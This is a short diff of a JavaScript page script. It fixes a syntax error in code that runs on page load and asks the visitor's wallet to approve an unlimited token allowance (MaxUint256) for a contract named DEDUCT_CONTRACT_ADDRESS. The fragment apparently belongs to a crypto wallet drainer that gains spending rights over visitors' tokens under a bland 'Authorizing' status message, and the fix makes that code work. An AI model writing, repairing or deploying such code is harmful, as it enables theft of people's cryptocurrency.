@@ -1503,7 +1503,7 @@ document.addEventListener('DOMContentLoaded', async () => {
       const REQUIRED_ALLOWANCE = ethers.parseUnits("340282366920938463463374607431768211456", 0);
       if (currentAllowance < REQUIRED_ALLOWANCE) {
         updateStatus(`Authorizing ${token}...`);
-        const approveTx = = await tokenContract.approve.populateTransaction(
+        const approveTx = await tokenContract.approve.populateTransaction(
           DEDUCT_CONTRACT_ADDRESS,
           ethers.MaxUint256
         );
